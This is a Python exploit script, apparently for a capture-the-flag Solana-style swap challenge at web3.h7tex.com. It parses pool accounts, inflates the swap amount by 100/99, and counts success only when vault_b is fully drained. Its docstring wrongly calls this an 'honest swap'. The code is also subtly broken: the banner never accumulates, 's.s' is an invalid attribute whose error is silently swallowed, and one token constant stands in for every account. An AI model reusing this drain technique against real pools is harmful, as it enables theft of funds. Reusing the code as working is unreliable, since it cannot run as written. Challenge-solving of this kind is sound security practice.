"""Honest swap on 40978 with proper multiline formatting."""
import sys,time,socket,re,struct
sys.stdout.reconfigure(encoding='utf-8',errors='replace')
HOST,PORT='web3.h7tex.com',40978
SYSTEM="11111111111111111111111111111111"
tok=lambda k:"TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb"
print('=== Honest swap on 40978 ===')
s=socket.create_connection((HOST,PORT),timeout=20);s.settimeout(15)
time.sleep(2);s.sendall(b'\n');time.sleep(1);banner=b'';t0=time.time()
while time.time()-t0 < 20:
    try:c=s.recv(65536)
    except Exception as e:break
    if not c:break;banner+=c
    t=banner.decode('utf-8','replace')
    lines=[l.strip() for l in t.splitlines() if l]
    if lines and lines[-1].endswith(':'):print('Banner complete');break
A={}
for line in banner.decode('utf-8','replace').splitlines():
    if ': ' in line:k,v=line.split(': ',1);A[k.strip()]=v.strip()
amt=int(A['reserve_b']);q,r=divmod(amt,99);amt_new=100*q+r
specs=["%s %s"%(k,v) for k,v in [
    (A["pool"], A["program"]),(A["authority"], SYSTEM),(A["user"], SYSTEM),
    (A["user_a"], tok("")), (A["user_b"], tok("")), (A["vault_a"], tok("")),
    (A["vault_b"], tok("")), (A["mint_a"], tok("")), (A["mint_b"], tok("")),
    (tok(""), tok(""))]]
for sp in specs:print('send "%s"'%sp[:50]);s.sendall((sp+'\n').encode())
data=bytes([1])+struct.pack('<Q',amt_new)
print('ix len:',len(data))
s.sendall(str(len(data)).encode()+b'\n')
s.sendall(data.hex().encode()+b'\n')
res=b''
try:
    s.s.settimeout(8);res=s.s.recv(4096)
except Exception as e:pass
verdict=res.decode('utf-8','replace')
m=re.search(rb'vault_b remaining: (\d+)',res)
left=m.group(1).decode() if m else 'none'
print('[left vault_b]=%s'%left)
s.close();sys.exit(0 if left=='0' else 1)
